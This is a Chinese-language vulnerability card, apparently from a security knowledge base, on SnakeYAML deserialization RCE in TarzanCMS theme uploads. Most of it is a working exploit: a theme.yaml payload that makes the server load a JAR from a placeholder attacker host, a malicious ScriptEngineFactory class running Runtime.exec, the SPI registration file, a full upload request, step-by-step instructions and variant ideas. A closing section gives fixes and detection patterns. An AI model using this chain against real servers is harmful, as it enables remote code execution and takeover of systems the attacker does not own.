---
id: web-java-deser-tarzancms-snakeyaml-scriptenginemanager-rce
title: TarzanCMS 主题包 theme.yaml 触发 SnakeYAML 1.27 反序列化：ScriptEngineManager→URLClassLoader 远程加载 SPI 执行命令
type: scenario
domain: web
path: web/java/deserialization
technique: snakeyaml-scriptenginemanager-urlclassloader-rce
tags:
- java
- snakeyaml
- yaml
- deserialization
- tarzancms
- scriptenginemanager
- urlclassloader
- spi
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V55
  verified_at: '2026-11-05T09:02:23+08:00'
  notes: 已对照原文与19张图核对：snakeyaml:1.27 依赖、ThemeService.upload→getZipThemeName 的 new Yaml().load(zis)、ScriptEngineManager→initEngines→ServiceLoader→hasNextService→loader.getResources、theme.yaml 的 ScriptEngineManager/URLClassLoader payload、dnslog 回连、yaml-payload.jar 被请求、ClassCastException 与 calc 弹出，均与图01-19一致；上传接口返回失败但构造方法已执行。原文仅给出 maven 依赖 snakeyaml:1.27（目标环境），未给影响版本/区间，按 brief 已清除 affected_versions。PoC 未在本机执行；frontmatter 无 sources/source_url。
url: /docs/web/java/deserialization/web-java-deser-tarzancms-snakeyaml-scriptenginemanager-rce/
draft: false
kb_aliases:
- TarzanCMS SnakeYAML 反序列化
- 泰山CMS 主题上传 RCE
- SnakeYAML ScriptEngineManager 利用链
- yaml-payload
- javax.script.ScriptEngineManager YAML
- theme.yaml 反序列化
---

## 一句话结论

TarzanCMS 的主题上传接口在解析 ZIP 内 `theme.yaml` 时使用 `new Yaml().load()`（SnakeYAML 1.27），未启用安全构造器；攻击者上传含 `!!javax.script.ScriptEngineManager` + `!!java.net.URLClassLoader` 的 YAML，即可让服务端通过 URLClassLoader 远程加载攻击者 JAR 中的 `ScriptEngineFactory` 并执行其构造方法，获得命令执行。

## 原理

- 主题上传 `POST /admin/themes/upload`（`ThemeController.upload`）把 ZIP 字节交给 `ThemeService.upload(byte[])`；后者先调用 `getZipThemeName()`：

  ```java
  public static String getZipThemeName(InputStream is) throws IOException {
      ZipInputStream zis = new ZipInputStream(is);
      ZipEntry zipEntry = zis.getNextEntry();
      while (zipEntry != null) {
          if (zipEntry.getName().contains("theme.yaml")) {
              Yaml yaml = new Yaml();
              Map<String,Object> map = yaml.load(zis);   // SnakeYAML 1.27 默认构造器
              return (String) map.get("name");
          }
          zipEntry = zis.getNextEntry();
      }
      return null;
  }
  ```

  项目依赖 `org.yaml:snakeyaml:1.27`；`new Yaml()` 使用默认 `Constructor`，允许 `!!类名` 全局标签实例化任意类并调用其单参数/多参数构造方法。
- 经典链：`!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/"]]]]`。SnakeYAML 实例化 `ScriptEngineManager` 时调用其构造方法 `ScriptEngineManager(ClassLoader)`：
  `init(loader)` → `initEngines(loader)` → `ServiceLoader.load(ScriptEngineFactory.class, loader)`。
- `ServiceLoader` 的 `iterator().hasNext()` 走到 `hasNextService()`：`fullName = "META-INF/services/" + service.getName()`（即 `META-INF/services/javax.script.ScriptEngineFactory`），再调用 `loader.getResources(fullName)`。由于 loader 是攻击者的 `URLClassLoader`，服务端会向 `http://attacker/` 请求该资源。
- 攻击者返回的 SPI 配置文件写入实现类名（如 `artsploit.AwesomeScriptEngineFactory`），`ServiceLoader` 解析后通过 URLClassLoader 加载该类的 JAR 并实例化；恶意实现类的构造方法中执行 `Runtime.getRuntime().exec(...)`，从而 RCE。
- 原文栈追踪显示：YAML 解析后得到 `ScriptEngineManager` 对象，`map.get("name")` 处抛出 `ClassCastException: javax.script.ScriptEngineManager cannot be cast to java.util.Map`，上传界面显示“上传失败”，但构造方法已执行、远程 JAR 已被请求，命令执行已经发生——不能以业务返回失败判断利用失败。

## 触发条件

- tarzan-cms 使用 SnakeYAML 1.27 且主题安装/上传功能可达（`/admin/themes/upload`），需要后台会话（原文在“主题管理 → 新增主题”上传）。
- 攻击者能上传 ZIP，且 ZIP 中某 entry 名称包含 `theme.yaml`。
- 目标 JVM 能出网访问攻击者 HTTP 服务（原文用 `python3 -m http.server 7877` 提供远程 JAR 与 SPI 文件）。
- 恶意 `ScriptEngineFactory` 实现类需与目标 JVM 版本兼容，且 `Runtime.exec` 该进程有权限执行。

## 利用步骤

1. 使用 yaml-payload 项目结构编写 `AwesomeScriptEngineFactory implements ScriptEngineFactory`，在无参构造方法中执行目标命令（原文 `Runtime.getRuntime().exec("calc")`）。
2. 通过 `META-INF/services/javax.script.ScriptEngineFactory` 注册实现类，编译并打包为 `yaml-payload.jar`，与 SPI 目录一起放到攻击者 HTTP 根目录（`python3 -m http.server 7877`）。
3. 构造 `theme.zip`，其中 `theme.yaml` 内容为：
   ```yaml
   !!javax.script.ScriptEngineManager [
     !!java.net.URLClassLoader [[
       !!java.net.URL ["http://attacker:7877/yaml-payload.jar"]
     ]]
   ]
   ```
4. 登录后台，进入“主题管理 → 新增主题 → 本地上传”，上传 `theme.zip`，抓包确认 `POST /admin/themes/upload`。
5. 观察攻击者 HTTP 日志出现 `GET /META-INF/services/javax.script.ScriptEngineFactory` 与 `GET /yaml-payload.jar`；目标主机执行命令（原文弹出计算器）。
6. 前端可能提示“上传失败”（ClassCastException），属正常现象；以 DNS/HTTP 回连与命令执行结果为准。

## PoC

```yaml
# theme.yaml（放入 theme.zip）
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker:7877/yaml-payload.jar"]
  ]]
]
```

```java
// artsploit/AwesomeScriptEngineFactory.java（节选）
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    // 其余接口方法返回 null 即可
}
```

```text
META-INF/services/javax.script.ScriptEngineFactory 内容：
artsploit.AwesomeScriptEngineFactory
```

```http
POST /admin/themes/upload HTTP/1.1
Host: target
Cookie: JSESSIONID=<有效后台会话>
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="theme.zip"
Content-Type: application/zip

<theme.zip 二进制>
------boundary--
```

## 变体与关联

- 变体：除 `ScriptEngineManager` 外，SnakeYAML 默认构造器还可实例化其他带危险构造方法的类；若目标限制出网，可尝试 `file:`/`jar:` 等 URL 或利用本机已有类。
- 变体：其他把用户可控 YAML 交给 `Yaml.load()` 的配置导入、主题/插件包解析、CI 配置解析等入口同理；`Yaml.load` 与 `Yaml.loadAs` 默认都不安全，需 `SafeConstructor` 或白名单类型。
- 关联：`[[web-java-deserialization-custom-readobject-runtime-exec]]` 等 Java 反序列化 RCE 卡；本卡的关键点是 YAML 全局标签实例化 + ServiceLoader/URLClassLoader SPI 的二次远程加载，而非原生反序列化链。
- 边界：需要后台会话；远程类加载依赖出网；JVM 版本/类名需匹配；上传流程随后可能因类型转换失败而回滚文件，但命令已执行。

## 检测与防御

- 修复：使用 `new Yaml(new SafeConstructor())` 或 SnakeYAML Engine 的安全模式解析不可信 YAML；禁止 `!!` 全局标签与任意类实例化；升级 SnakeYAML 并按官方公告配置安全解析。
- 加固：主题包只接受受信任来源并做签名校验；解析 `theme.yaml` 时限制字段白名单（只取 `name` 等基础类型）；应用进程最小权限运行。
- 网络：限制应用服务器出站访问（尤其是任意 HTTP/JAR 下载），配置 egress 白名单；监控 Java 进程对外发起的异常 HTTP 请求。
- 检测：上传 ZIP 中 `theme.yaml` 出现 `!!javax.script.ScriptEngineManager`、`!!java.net.URLClassLoader`、`!!java.net.URL` 等标签；应用日志出现 `ClassCastException: javax.script.ScriptEngineManager`；服务器向陌生域名请求 `META-INF/services/*` 或 `.jar`；DNSLog/HTTP 回连记录。
